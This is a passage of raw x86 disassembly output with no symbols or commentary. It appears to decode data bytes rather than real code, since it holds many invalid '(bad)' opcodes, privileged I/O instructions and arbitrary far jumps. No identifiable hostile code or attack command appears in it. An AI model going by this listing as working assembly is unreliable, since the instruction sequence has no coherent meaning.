  412736:	mov    edx,0xb3cce70e
  41273b:	add    bh,BYTE PTR [ebp+0x6399a253]
  412741:	jnp    0x41274a
  412743:	retf   
  412744:	push   cs
  412745:	and    dl,BYTE PTR [ebp+0x20]
  412748:	repnz out 0xec,eax
  41274b:	or     al,0x19
  41274d:	adc    edx,DWORD PTR [ecx]
  41274f:	xchg   DWORD PTR [ebp+0x4158c3fb],ebx
  412755:	push   ds
  412756:	and    dh,BYTE PTR [ecx]
  412758:	ins    DWORD PTR es:[edi],dx
  412759:	cmp    al,0x34
  41275b:	sub    al,0xce
  41275d:	loopne 0x4127bb
  41275f:	popa   
  412760:	sub    eax,0x4dbe047c
  412765:	sar    BYTE PTR [eax+0x51],1
  412768:	scas   eax,DWORD PTR es:[edi]
  412769:	fsub   QWORD PTR [ebx+0x42]
  41276c:	sbb    al,0xc8
  41276e:	sar    DWORD PTR [edx+0x7e],cl
  412771:	add    ah,BYTE PTR [edi+0x5fe64b29]
  412777:	xchg   esp,eax
  412778:	fisub  WORD PTR [ebp+0x465eddcd]
  41277e:	stc    
  41277f:	repnz dec edi
  412781:	mov    DWORD PTR [edx+edx*1],esp
  412784:	push   ebp
  412785:	clc    
  412786:	out    0x29,eax
  412788:	push   eax
  412789:	in     eax,0xe8
  41278b:	(bad)  
  41278c:	and    eax,0x2a087657
  412791:	mov    ebp,edi
  412793:	mov    esi,0x4cca875e
  412798:	lock or ecx,ebp
  41279b:	out    0x5b,al
  41279d:	lods   al,BYTE PTR ds:[esi]
  41279e:	cdq    
  41279f:	sub    BYTE PTR [esi],0x9f
  4127a2:	cmp    eax,0x5d20833d
  4127a7:	xor    BYTE PTR [ebx],ch
  4127a9:	mov    eax,0xe8267e33
  4127ae:	and    ch,dl
  4127b0:	cwde   
  4127b1:	test   al,0x8a
  4127b3:	cdq    
  4127b4:	pop    ds
  4127b5:	test   al,0xeb
  4127b7:	dec    ebx
  4127b8:	lods   eax,DWORD PTR ds:[esi]
  4127b9:	xor    ecx,DWORD PTR [edx-0x68]
  4127bc:	pop    esp
  4127bd:	adc    bh,dl
  4127bf:	enter  0xe9a9,0xc
  4127c3:	icebp  
  4127c4:	out    0x3c,eax
  4127c6:	cmp    eax,DWORD PTR [edi]
  4127c8:	or     ch,BYTE PTR [edi+esi*8-0x38a4ae3f]
  4127cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4127d0:	lahf   
  4127d1:	cmp    edx,ecx
  4127d3:	mov    esi,0xb9a14f12
  4127d8:	mov    ch,0xb3
  4127da:	test   al,0x49
  4127dc:	xor    DWORD PTR [esi+0xd],edi
  4127df:	add    ch,al
  4127e1:	pop    ds
  4127e2:	xchg   esp,eax
  4127e3:	add    ah,BYTE PTR [ebp+0x3c]
  4127e6:	outs   dx,DWORD PTR ds:[esi]
  4127e7:	sete   BYTE PTR [bx+si+0x22b9]
  4127ed:	test   BYTE PTR [eax-0x67],ch
  4127f0:	jle    0x412834
  4127f2:	inc    BYTE PTR [si-0x49]
  4127f6:	sub    DWORD PTR [ecx+0x19],edx
  4127f9:	jg     0x4127c4
  4127fb:	xor    eax,0xda5fc0e
  412800:	xchg   ebx,eax
  412801:	sub    ah,al
  412803:	pop    ss
  412804:	test   DWORD PTR [ebx],ebp
  412806:	sub    DWORD PTR [esi-0x7c6edfbe],esp
  41280c:	out    0x3f,al
  41280e:	cmp    DWORD PTR [ecx+0x6d],0x1e
  412812:	(bad)  
  412813:	aas    
  412814:	call   FWORD PTR ds:0xd69aa4bd
  41281a:	lods   al,BYTE PTR ds:[esi]
  41281b:	shr    DWORD PTR [esi],cl
  41281d:	sub    BYTE PTR [ebp+0x5833da86],dl
  412823:	jmp    ebp
  412825:	sbb    ah,BYTE PTR [ebp-0x1e]
  412828:	xor    eax,0x9c1839c4
  41282d:	stc    
  41282e:	idiv   edi
  412830:	call   0x98d7:0x22e08095
  412837:	aam    0xdd
  412839:	rcr    BYTE PTR [ebp*2-0x5696ff13],cl
  412840:	std    
  412841:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412842:	repz retf 0x6505
  412846:	std    
  412847:	or     DWORD PTR [eax+edi*8],esp
  41284a:	addr16 cmp eax,0xdb9c0700
  412850:	mov    dh,BYTE PTR [esi]
  412852:	neg    dh
  412854:	gs ins DWORD PTR es:[edi],dx
  412856:	xor    edi,eax
  412858:	inc    ebx
  412859:	rcl    DWORD PTR [edi-0x34],cl
  41285c:	and    BYTE PTR [ecx],0xb4
  41285f:	sbb    al,0xc1
  412861:	adc    DWORD PTR ds:0x1583ac78,edi
  412867:	jl     0x41284a
  412869:	inc    ecx
  41286a:	sbb    al,0x69
  41286c:	jmp    0x3e91:0x1e1dbf97
  412873:	and    BYTE PTR [edx+0x6725729b],dh
  412879:	lods   eax,DWORD PTR ds:[esi]
  41287a:	mov    eax,ds:0x5511f3f5
  41287f:	rcr    DWORD PTR [ebp-0x3a],0x11
  412883:	pop    edx
  412884:	xor    eax,0x7c50682
  412889:	popa   
  41288a:	cdq    
  41288b:	int    0x6e
  41288d:	dec    ebp
  41288e:	add    BYTE PTR [edi],ah
  412890:	test   BYTE PTR [edx],0xbb
  412893:	dec    ebp
  412894:	mov    ds:0xf2ec3ca3,eax
  412899:	pop    esi
  41289a:	rcl    BYTE PTR [edx-0x44],1
  41289d:	dec    ebp
  41289e:	add    al,0xd9
  4128a0:	jno    0x4128f0
  4128a2:	sbb    BYTE PTR [edi],ah
  4128a4:	lock push eax
  4128a6:	je     0x4128a5
  4128a8:	ja     0x4128ba
  4128aa:	push   ebp
  4128ab:	loopne 0x412842
  4128ad:	loope  0x412833
  4128af:	adc    al,0x66
  4128b1:	lods   eax,DWORD PTR ds:[esi]
  4128b2:	and    eax,0xb6367b7b
  4128b7:	mov    ebx,0xd8d3cf7f
  4128bc:	push   ss
  4128bd:	inc    ebp
  4128be:	or     BYTE PTR [ecx+0x74],ah
  4128c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4128c2:	pop    eax
  4128c3:	mov    ds:0x18ecf730,al
  4128c8:	inc    ebp
  4128c9:	retf   0x6fdb
  4128cc:	inc    eax
  4128cd:	out    dx,eax
  4128ce:	clc    
  4128cf:	pop    edx
  4128d0:	in     al,0x94
  4128d2:	in     eax,0xda
  4128d4:	(bad)
  4128d8:	sub    esi,DWORD PTR [ebx]
  4128da:	nop
  4128db:	or     eax,DWORD PTR [ebx+edx*1-0x15a231e]
  4128e2:	push   edx
  4128e3:	jp     0x4128d3
  4128e5:	xchg   DWORD PTR [edi],edx
  4128e7:	lods   al,BYTE PTR ds:[esi]
  4128e8:	sbb    eax,0xb3262e2e
  4128ed:	add    al,0xc4
  4128ef:	adc    al,0xef
  4128f2:	or     ebx,ebx
  4128f4:	push   ecx
  4128f5:	mov    BYTE PTR [edi-0x12],dh
  4128f8:	out    dx,eax
  4128f9:	fwait
  4128fa:	or     DWORD PTR [edx-0x77dc7d51],esi
  412900:	and    ah,BYTE PTR [ebp+esi*4+0x2]
  412904:	push   edi
  412905:	push   cs
  412906:	ret    
  412907:	fld    DWORD PTR [esi+0x623cce7a]
  41290d:	mov    dh,0xb3
  41290f:	sbb    al,0x76
  412911:	(bad)  
  412912:	mov    ebx,0xda1c15dd
  412917:	add    esp,ecx
  412919:	ret    
  41291a:	mov    WORD PTR [ebp+0x30],ss
  41291d:	add    DWORD PTR [esi+0x39],eax
  412920:	cmp    ah,ch
  412922:	xchg   esp,eax
  412923:	or     DWORD PTR [ebx],edi
  412925:	or     DWORD PTR [esi],ebx
  412927:	lods   al,BYTE PTR ds:[esi]
  412928:	pushf  
  412929:	jbe    0x412967
  41292b:	sub    dl,BYTE PTR [edi+ebp*2+0x2980df96]
  412932:	repnz add DWORD PTR [edx+0x21ba05db],esi
  412939:	inc    ecx
  41293a:	les    eax,FWORD PTR [ecx]
  41293c:	jmp    0x4128ea
  41293e:	clc    
  41293f:	or     DWORD PTR [eax-0x35],ebx
  412942:	fdiv   DWORD PTR [eax*1+0x13972d98]
  412949:	xor    ebx,DWORD PTR [ecx-0x2a]
  41294c:	sub    edi,DWORD PTR [edx-0x5f0f4df1]
  412952:	sar    DWORD PTR es:[ebp-0x76],cl
  412956:	stos   DWORD PTR es:[edi],eax
  412957:	xor    BYTE PTR [edx],bh
  412959:	xchg   BYTE PTR [ecx-0x48],dh
  41295c:	out    dx,eax
  41295d:	pop    ds
  41295e:	dec    ebx
  41295f:	push   esp
  412960:	cmp    BYTE PTR [ecx+0x7c],bh
  412963:	mov    bh,0xfc
  412965:	popf   
  412966:	cmp    ah,ah
  412968:	xor    ebx,0xe3feb60f
  41296e:	sbb    al,0xa3
  412970:	lods   eax,DWORD PTR ds:[esi]
  412971:	lods   eax,DWORD PTR ds:[esi]
  412972:	xchg   ebx,eax
  412973:	inc    ecx
  412974:	fsubr  st(5),st
  412976:	or     DWORD PTR [edx+ebx*2+0x3b],ebx
  41297a:	or     esp,DWORD PTR [esi+0xd]
  41297d:	and    ebx,ecx
  41297f:	pop    ecx
  412980:	mov    edx,DWORD PTR [ebx+edx*4]
  412983:	inc    edi
  412984:	aad    0x77
  412986:	popa   
  412987:	lahf   
  412988:	jg     0x4129b9
  41298a:	xchg   DWORD PTR [edx+0x7d4575d8],ebp
  412990:	xor    BYTE PTR [edi-0x2d],0x52
  412994:	xchg   ecx,eax
  412995:	inc    eax
  412996:	push   eax
  412997:	push   edi
  412998:	push   edx
  412999:	or     edx,ebx
  41299b:	aam    0x72
  41299d:	out    dx,eax
  41299e:	outs   dx,BYTE PTR ds:[esi]
  41299f:	stos   BYTE PTR es:[edi],al
  4129a0:	pop    es
  4129a1:	sqrtps xmm1,XMMWORD PTR [esi-0x69]
  4129a5:	out    0x8a,al
  4129a7:	aas    
  4129a8:	shl    BYTE PTR [ebp-0x3d],0x27
  4129ac:	ja     0x4129cb
  4129ae:	(bad)  
  4129af:	fstp   QWORD PTR [ecx+0x4485c379]
  4129b5:	sub    DWORD PTR [eax-0x4b6267d3],eax
  4129bb:	dec    edi
  4129bc:	mov    al,ds:0xaa553879
  4129c1:	ret    0x65eb
  4129c4:	push   0x30
  4129c6:	outs   dx,DWORD PTR ds:[esi]
  4129c7:	sub    esp,0xffffffe1
  4129ca:	leave  
  4129cb:	adc    al,0x30
  4129cd:	out    dx,al
  4129ce:	in     al,0xb8
  4129d0:	jbe    0x4129c4
  4129d2:	and    eax,edx
  4129d4:	xchg   edi,eax
  4129d5:	jge    0x412a05
  4129d7:	mov    edx,DWORD PTR [esi+0x48e52ebd]
  4129dd:	cmp    ch,BYTE PTR [edi-0x1c3b9a78]
  4129e3:	inc    edx
  4129e4:	jle    0x412a65
  4129e6:	stc    
  4129e7:	and    DWORD PTR [ebx-0x5a1d1246],0x3cfa5ea2
  4129f1:	mov    ebx,0xe9f003f3
  4129f6:	push   esp
  4129f7:	mov    al,0x67
  4129f9:	dec    edi
  4129fa:	push   esi
  4129fb:	arpl   WORD PTR [ecx+0x65],ax
  4129fe:	inc    ebx
  4129ff:	aad    0xf6
  412a01:	add    al,0x1f
  412a03:	jecxz  0x412a33
  412a05:	test   DWORD PTR [ebp-0x344053a9],esp
  412a0b:	lods   al,BYTE PTR ds:[esi]
  412a0c:	xor    esi,DWORD PTR [ecx]
  412a0e:	out    dx,eax
  412a0f:	in     al,0xad
  412a11:	shr    DWORD PTR [ebp+0x5f1b71fc],0x16
  412a18:	je     0x4129f8
  412a1a:	mov    ch,0xf
  412a1c:	xor    ebx,DWORD PTR [ebx]
  412a1e:	fwait
  412a1f:	xchg   al,ah
  412a21:	dec    edx
  412a22:	jge    0x4129d5
  412a24:	add    ah,bh
  412a26:	pop    esp
  412a27:	jmp    0x6aa7055
  412a2c:	jbe    0x412a4c
  412a2e:	fs cs std 
  412a31:	mov    al,0xa0
  412a33:	add    BYTE PTR [edi+eiz*1+0x5335f95c],bh
  412a3a:	sub    DWORD PTR [eax-0x49d88ac],esi
  412a40:	mov    bl,0x71
  412a42:	pop    edi
  412a43:	ds pop eax
  412a45:	stos   DWORD PTR es:[edi],eax
  412a46:	xchg   esp,eax
  412a47:	mov    eax,0x3de286b1
  412a4c:	into   
  412a4d:	xchg   esp,ebp
  412a4f:	lock sub dh,BYTE PTR [esi+0x23e79db1]
  412a56:	cdq    
  412a57:	jmp    0x412acd
  412a59:	nop
  412a5a:	lea    ebx,[edi-0x41]
  412a5d:	fwait
  412a5e:	sbb    BYTE PTR [ebx],cl
  412a60:	xor    eax,0x2bbe71dc
  412a65:	lock cmp DWORD PTR [ebx],0x1cf6ee60
  412a6c:	pop    ds
  412a6d:	imul   ebx,DWORD PTR [ebx+0x71],0x11
  412a71:	jbe    0x412a74
  412a73:	das    
  412a74:	adc    dh,dl
  412a76:	sub    BYTE PTR [ebp+0x0],al
  412a79:	xor    bh,bl
  412a7b:	imul   edi,DWORD PTR [ecx-0x3f],0x46
  412a7f:	jg     0x412a67
  412a81:	clc    
  412a82:	inc    eax
  412a83:	xlat   BYTE PTR ds:[ebx]
  412a84:	push   ecx
  412a85:	add    BYTE PTR [ecx+0x664ebac2],dl
  412a8b:	std    
  412a8c:	ins    BYTE PTR es:[edi],dx
  412a8d:	push   ss
  412a8e:	or     eax,0x2a54afca
  412a93:	sub    DWORD PTR [edi+0x53],eax
  412a96:	gs inc eax
  412a98:	scas   eax,DWORD PTR es:[edi]
  412a99:	xor    eax,0x15c84d08
  412a9e:	or     BYTE PTR [ebp+esi*1-0x4e974d3a],bh
  412aa5:	mov    edi,0x8d8af5cd
  412aaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412aab:	jns    0x412ae6
  412aad:	(bad)  
  412aae:	lahf   
  412aaf:	and    ecx,esi
  412ab1:	xor    eax,0x5203830b
  412ab6:	es pop edi
  412ab8:	sti    
  412ab9:	pop    ebp
  412aba:	mov    cl,0xd9
  412abc:	jmp    DWORD PTR [ebp-0x67]
  412abf:	imul   edi,ecx,0x4264befd
  412ac5:	out    dx,al
  412ac6:	cmp    DWORD PTR [ebx-0x7e],edi
  412ac9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412aca:	fwait
  412acb:	cli    
  412acc:	push   eax
  412acd:	test   DWORD PTR [ebp+0x7eb67015],0xfac0280
  412ad7:	fnstenv [ebx-0x4f58b315]
  412add:	mov    WORD PTR [edx],es
  412adf:	std    
  412ae0:	repz adc ebx,DWORD PTR [esi-0x7c]
  412ae4:	inc    ebp
  412ae5:	hlt    
  412ae6:	mov    bl,0x7b
  412ae8:	mov    ebx,0xdbc98cd
  412aed:	int3   
  412aee:	add    ah,ch
  412af0:	push   0xffffffe6
  412af2:	sub    eax,0xb3da41cf
  412af7:	jl     0x412b13
  412af9:	ins    DWORD PTR es:[edi],dx
  412afa:	sbb    eax,0x6c701799
  412aff:	adc    BYTE PTR [ebp-0x7c],ch
  412b02:	inc    ecx
  412b03:	mov    ds:0x9064fdbe,al
  412b08:	int3   
  412b09:	outs   dx,BYTE PTR ds:[esi]
  412b0a:	(bad)  
  412b0b:	jae    0x412ab6
  412b0d:	jno    0x412a98
  412b0f:	les    esi,FWORD PTR [ecx]
  412b11:	jp     0x412a9a
  412b13:	scas   al,BYTE PTR es:[edi]
  412b14:	cld    
  412b15:	fild   DWORD PTR [edi+edi*8+0x1d31493]
  412b1c:	call   0x326b:0x4303940e
  412b23:	adc    bh,BYTE PTR [eax-0x5b76665c]
  412b29:	ja     0x412b80
  412b2b:	or     BYTE PTR [edx+0x6237163b],0xf4
  412b32:	sar    BYTE PTR [eax+0x24],cl
  412b35:	dec    ebp
  412b36:	jae    0x412b16
  412b38:	arpl   ax,bx
  412b3a:	repnz ins BYTE PTR es:[edi],dx
  412b3c:	pop    eax
  412b3d:	xchg   ebp,eax
  412b3e:	stos   DWORD PTR es:[edi],eax
  412b3f:	jbe    0x412b6f
  412b41:	retf   
  412b42:	xor    ebp,DWORD PTR [edx]
  412b44:	imul   eax,DWORD PTR [eax],0xffffff80
  412b47:	xor    esp,0x9
  412b4a:	aam    0x41
  412b4c:	add    edi,esi
  412b4e:	and    eax,0x57e8f4e
  412b53:	aam    0x9b
  412b55:	or     esp,DWORD PTR [esi]
  412b57:	out    dx,al
  412b58:	scas   eax,DWORD PTR es:[edi]
  412b59:	js     0x412b95
  412b5b:	and    al,0x8b
  412b5d:	pop    edx
  412b5e:	scas   al,BYTE PTR es:[edi]
  412b5f:	out    0x82,eax
  412b61:	dec    esi
  412b62:	shl    BYTE PTR [edi-0x73],0x2e
  412b66:	shl    BYTE PTR [ebx],1
  412b68:	loope  0x412bd0
  412b6a:	mov    eax,0x2ae5b45d
  412b6f:	fsubr  QWORD PTR [ecx]
  412b71:	repnz (bad)
  412b74:	mov    esp,0x4d321e91
  412b79:	clc    
  412b7a:	nop    edi
  412b7d:	adc    BYTE PTR [ebp+edx*2-0x53dbd75d],bh
  412b84:	popf   
  412b85:	adc    ch,cl
  412b87:	adc    cl,BYTE PTR [eax]
  412b89:	sub    eax,0x88af7b8e
  412b8e:	mov    bl,BYTE PTR [edi-0x7691ef22]
  412b94:	leave  
  412b95:	mov    al,ds:0xfc6ae6d0
  412b9a:	mov    eax,ds:0xa6317b59
  412b9f:	aad    0x30
  412ba1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ba2:	xchg   esi,eax
  412ba3:	sub    ebp,ebx
  412ba5:	push   0xaa8493c8
  412baa:	dec    ebp
  412bab:	jge    0x412b41
  412bad:	leave  
  412bae:	iret   
  412baf:	mov    ch,0x36
  412bb1:	jae    0x412c0e
  412bb3:	jl     0x412bfc
  412bb5:	adc    bl,BYTE PTR [edi+0x45787c71]
  412bbb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412bbc:	and    DWORD PTR [esi-0xf],ebx
  412bbf:	mov    DWORD PTR ds:0x485e7d03,ecx
  412bc5:	retw   
  412bc7:	fwait
  412bc8:	repz (bad) 
  412bca:	mov    edx,0x9c3356e2
  412bcf:	sub    al,0x41
  412bd1:	mov    edx,0x7c06c085
  412bd6:	sbb    eax,0x65a5414c
  412bdb:	sub    DWORD PTR [edx+0x78],edi
  412bde:	iret   
  412bdf:	add    BYTE PTR [ebx+0xd],bh
  412be2:	mov    ebx,0x9f2f7625
  412be7:	neg    BYTE PTR ds:0xeea67ff2
  412bed:	jmp    0x412bb1
  412bef:	mov    eax,ebp
  412bf1:	stos   DWORD PTR es:[edi],eax
  412bf2:	push   ss
  412bf3:	cmp    eax,0x9a571a7f
  412bf8:	(bad)  
  412bfa:	clc    
  412bfb:	call   0x23cd2a6a
  412c00:	dec    eax
  412c01:	addr16 daa 
  412c03:	jo     0x412b88
  412c05:	cmp    eax,0x4954e78b
  412c0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c0b:	loope  0x412bb7
  412c0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412c0e:	add    DWORD PTR [ebp+esi*1+0x68],ecx
  412c12:	dec    esi
  412c13:	sub    dl,BYTE PTR [ecx*8+0x70475c49]
  412c1a:	jp     0x412c15
  412c1c:	sbb    esi,esi
  412c1e:	sub    eax,0xca6bc702
  412c23:	mov    ah,0x49
  412c25:	xor    ebp,esi
  412c27:	jne    0x412bf6
  412c29:	jle    0x412c25
  412c2b:	pop    ds
  412c2c:	(bad)  
  412c2d:	and    al,0xa6
  412c2f:	push   ds
  412c30:	jb     0x412c8b
  412c32:	fs leave 
  412c34:	mov    bl,0x3a
  412c36:	lds    esp,FWORD PTR [eax+ebp*2+0x7a68c014]
  412c3d:	aaa    
  412c3e:	pop    ss
  412c3f:	into   
  412c40:	fs jecxz 0x412c11
  412c43:	pop    es
  412c44:	xor    BYTE PTR [eax+0x491e1b36],0xe9
  412c4b:	inc    ebp
  412c4c:	inc    ebp
  412c4d:	inc    edi
  412c4e:	and    DWORD PTR ds:0x80a2075b,edi
  412c54:	sbb    DWORD PTR [edx],ebx
  412c56:	push   esi
  412c57:	hlt    
  412c58:	dec    ebp
  412c59:	push   0x5e
  412c5b:	pusha  
  412c5c:	shl    DWORD PTR [edi],cl
  412c5e:	cmp    dl,BYTE PTR ds:0xd1d7ab58
  412c64:	dec    edx
  412c65:	stc    
  412c66:	out    0x41,eax
  412c68:	add    BYTE PTR [ebx+0x7bd2f8a1],dh
  412c6e:	loopne 0x412c5e
  412c70:	or     DWORD PTR [edi-0xe8798c8],esp
  412c76:	and    ah,ch
  412c78:	xchg   esp,eax
  412c79:	xchg   esi,eax
  412c7a:	push   cs
  412c7b:	push   ebp
  412c7c:	ss mov al,0x46
  412c7f:	and    DWORD PTR [ebx-0x2c476423],edi
  412c85:	test   al,0x77
  412c87:	cmp    DWORD PTR [eax+0x5c04649a],ebx
  412c8d:	inc    ebp
  412c8e:	mov    bl,cl
  412c90:	ins    BYTE PTR es:[edi],dx
  412c91:	add    eax,esp
  412c93:	ins    BYTE PTR es:[edi],dx
  412c94:	mov    eax,0xd13e7a87
  412c99:	gs push edi
  412c9b:	dec    eax
  412c9c:	xor    DWORD PTR [ebx+0x20],edi
  412c9f:	add    ebx,eax
  412ca1:	mov    bl,0x3
  412ca3:	bnd jmp 0x412cb4
  412ca6:	push   ebp
  412ca7:	pop    ds
  412ca8:	fcom   DWORD PTR [ebx+ebp*8+0x10]
  412cac:	ins    BYTE PTR es:[edi],dx
  412cad:	repnz or edx,DWORD PTR [esi]
  412cb0:	fs adc bh,dl
  412cb3:	mov    ds:0x9f91d4cd,al
  412cb8:	in     al,dx
  412cb9:	gs xor bl,dh
  412cbc:	call   0xe4392355
  412cc1:	loope  0x412c8d
  412cc3:	jns    0x412c46
  412cc5:	je     0x412d15
  412cc7:	loop   0x412c8a
  412cc9:	jbe    0x412ce5
  412ccb:	and    BYTE PTR [ebx-0x4f],dh
  412cce:	push   ebx
  412ccf:	cwde   
  412cd0:	xor    bh,BYTE PTR [esi-0x3585b115]
  412cd6:	jmp    0xda05:0x277d9a55
  412cdd:	add    DWORD PTR [edx-0x56],0x77
  412ce1:	bound  edx,QWORD PTR [ebx]
  412ce3:	pop    esp
  412ce4:	xor    DWORD PTR [ebx],0xffffff88
  412ce7:	push   edi
  412ce8:	mov    dl,0x6c
  412cea:	and    BYTE PTR [ecx-0x280da941],bh
  412cf0:	sub    BYTE PTR [ebx-0x2de07811],al
  412cf6:	int    0x93
  412cf8:	mov    bl,0xc6
  412cfa:	cdq    
  412cfb:	retf   
  412cfc:	adc    ecx,DWORD PTR [edi-0x3f]
  412cff:	push   es
  412d00:	dec    ecx
  412d01:	pushf  
  412d02:	or     bl,0xab
  412d05:	js     0x412d84
  412d07:	pop    es
  412d08:	mov    DWORD PTR [ebp+0x4b6e63e2],eax
  412d0e:	test   al,0x8a
  412d10:	adc    esi,DWORD PTR [eax-0x30]
  412d13:	or     bh,BYTE PTR [ecx+0x3f]
  412d16:	mov    bl,BYTE PTR [edi]
  412d18:	js     0x412cc9
  412d1a:	cwde   
  412d1b:	icebp  
  412d1c:	add    BYTE PTR [edx],0xdb
  412d1f:	into   
  412d20:	fdiv   QWORD PTR ds:0x5602b6c2
  412d26:	mov    esi,0x5fc0fbe4
  412d2b:	ret    0xb381
  412d2e:	int3   
  412d2f:	cmp    al,0x8c
  412d31:	pop    ss
  412d32:	fild   WORD PTR [ecx-0x28010125]
  412d38:	xor    al,0xb9
  412d3a:	data16 js 0x412d24
  412d3d:	lods   al,BYTE PTR ds:[esi]
  412d3e:	loopne 0x412ccb
  412d40:	add    BYTE PTR [bx+si],0xc2
  412d44:	adc    cl,bh
  412d46:	in     eax,dx
  412d47:	cdq    
  412d48:	mov    esi,0xc9382670
  412d4d:	mov    esi,0xf3c03cd2
  412d52:	imul   ebp,DWORD PTR [eax],0x3af60e5d
  412d58:	lea    ebp,[esi]
  412d5a:	sub    DWORD PTR [edx],ebp
  412d5c:	xchg   edx,eax
  412d5d:	(bad)  
  412d5e:	lahf   
  412d5f:	jne    0x412ce1
  412d61:	hlt    
  412d62:	mov    bl,0xa7
  412d64:	or     eax,0x28b2a3d9
  412d69:	es pop es
  412d6b:	pop    es
  412d6c:	pop    bp
  412d6e:	cmp    ebx,esp
  412d70:	cld    
  412d71:	xor    dh,ah
  412d73:	sub    DWORD PTR [ecx+0x7],0x55
  412d77:	and    BYTE PTR [edx],bl
  412d79:	adc    eax,0xabdc84d0
  412d7e:	rcl    DWORD PTR [esi+0x38],cl
  412d81:	ds push es
  412d83:	pop    esi
  412d84:	(bad)  
  412d85:	xlat   BYTE PTR ds:[ebx]
  412d86:	push   edi
  412d87:	fiadd  WORD PTR [esi+0x20a2c9b1]
  412d8d:	add    al,0xf7
  412d8f:	or     esp,edx
  412d91:	fisub  DWORD PTR [eax-0x80]
  412d94:	xchg   esi,eax
  412d95:	in     eax,0x8c
  412d97:	rcr    BYTE PTR [eax],1
  412d99:	(bad)  
  412d9a:	sbb    BYTE PTR [edx+0x2e758193],ch
  412da0:	(bad)  
  412da1:	adc    bl,BYTE PTR [edx+ebp*4]
  412da4:	adc    edx,0xe21f427c
  412daa:	and    al,0x86
  412dac:	(bad)  
  412dad:	stos   DWORD PTR es:[edi],eax
  412dae:	xor    DWORD PTR [ecx-0x6c],ebx
  412db1:	or     sp,WORD PTR [esi]
  412db4:	dec    edx
  412db5:	int    0x11
  412db7:	arpl   WORD PTR ds:0x7421ad37,bp
  412dbd:	or     ch,BYTE PTR [eax-0x1de87ca6]
  412dc3:	mov    ecx,0xa50561c3
  412dc8:	mul    DWORD PTR [ecx]
  412dca:	repnz push eax
  412dcc:	inc    cl
  412dce:	repz repnz leave 
  412dd1:	mov    bh,0xfc
  412dd3:	push   ecx
  412dd4:	jne    0x412d78
  412dd6:	pop    eax
  412dd7:	jge    0x412e40
  412dd9:	mov    cl,0x85
  412ddb:	sbb    eax,0x7aed1871
  412de0:	or     DWORD PTR [esi-0x53],eax
  412de3:	leave  
  412de4:	jp     0x412e2c
  412de6:	mov    WORD PTR [edi],?
  412de8:	repz xchg edx,eax
  412dea:	into   
  412deb:	pop    ds
  412dec:	inc    ecx
  412ded:	push   ecx
  412dee:	jne    0x412df2
  412df0:	jmp    0xeb83d0b4
  412df5:	jb     0x412e4a
  412df7:	mov    ecx,0x3cda586f
  412dfc:	and    al,0x4a
  412dfe:	pop    edx
  412dff:	push   ss
  412e00:	das    
  412e01:	inc    esi
  412e02:	fsubr  DWORD PTR [edx+ebp*8]
  412e05:	sar    DWORD PTR [ebx],cl
  412e07:	jmp    0xfe09:0xa009c763
  412e0e:	pop    esi
  412e0f:	add    al,0xf4
  412e11:	aam    0x77
  412e13:	mov    eax,0xd23779ac
  412e18:	xchg   ebx,eax
  412e19:	dec    eax
  412e1a:	and    BYTE PTR [ecx+0x1a],0xe4
  412e1e:	mov    dl,0xe2
  412e20:	mov    DWORD PTR [edx],esi
  412e22:	out    0x14,eax
  412e24:	xchg   esp,ecx
  412e26:	sub    al,0x8e
  412e28:	retf   
  412e29:	xchg   edi,eax
  412e2a:	sbb    DWORD PTR [ebp+0x2613a1c1],ebp
  412e30:	fild   DWORD PTR [edx+0x2d7568ab]
  412e36:	out    0x5e,eax
  412e38:	leave  
  412e39:	retf   
  412e3a:	mov    edi,0x6e605a9a
  412e3f:	cs adc al,0x7b
  412e42:	dec    ecx
  412e43:	xor    BYTE PTR [esi-0x68191034],al
  412e49:	sub    eax,0xf07eac87
  412e4e:	pop    ss
  412e4f:	jne    0x412e0e
  412e51:	sti    
  412e52:	inc    ebp
  412e53:	or     eax,0x493dad07
  412e58:	shr    cl,0xd5
  412e5b:	xor    bh,cl
  412e5d:	or     BYTE PTR [ebx+0x3d],0x1c
  412e61:	mov    dl,0x2b
  412e63:	and    bl,ah
  412e65:	shr    BYTE PTR [ebx-0x2c],cl
  412e68:	xchg   ebp,eax
  412e69:	fldenv [ebx+edx*1+0x513327d9]
  412e70:	in     al,0xfa
  412e72:	rcr    DWORD PTR ds:0xb2085bab,0x58
  412e79:	aas    
  412e7a:	mov    ds:0xd162e281,al
  412e7f:	mov    DWORD PTR [edi+0x310477e0],ecx
  412e85:	dec    edx
  412e86:	aas    
  412e87:	test   al,0x67
  412e89:	(bad)  
  412e8b:	iret   
  412e8c:	mov    ecx,0xf797ebfd
  412e91:	rol    BYTE PTR ds:0xc0f4e73d,cl
  412e97:	add    al,0xb5
  412e99:	mov    ebp,0xb3e064d5
  412e9e:	unpckhps xmm0,XMMWORD PTR [edi]
  412ea1:	mov    ds:0x50284d88,eax
  412ea6:	sub    ch,BYTE PTR [esi]
  412ea8:	nop
  412ea9:	dec    ebx
  412eaa:	imul   ecx,DWORD PTR [esi+0x3c],0xfffffff9
  412eae:	mov    WORD PTR [eax+edx*8],?
  412eb1:	adc    eax,0xdc386a0b
  412eb6:	mov    bh,0x35
  412eb8:	call   0x4bb44a0c
  412ebd:	sub    eax,0xeebe5dab
  412ec2:	jmp    FWORD PTR [ecx-0x7a]
  412ec5:	sub    ebp,DWORD PTR [edi+0x6f]
  412ec8:	(bad)  
  412ec9:	sub    BYTE PTR [ebp-0x4d2fd108],cl
  412ecf:	dec    ebx
  412ed0:	pop    esi
  412ed1:	push   0xffffff8b
  412ed3:	popf   
  412ed4:	mov    esi,0xa2b673ea
  412ed9:	and    eax,0x279b78c7
  412ede:	jl     0x412ebd
  412ee0:	or     al,0x5f
  412ee2:	add    DWORD PTR ds:[esp+ebx*2],0xd
  412ee7:	xchg   DWORD PTR [ebp+0xb],ebp
  412eea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412eeb:	pusha  
  412eec:	jmp    0x92d3fd92
  412ef1:	in     al,dx
  412ef2:	dec    esp
  412ef3:	push   edx
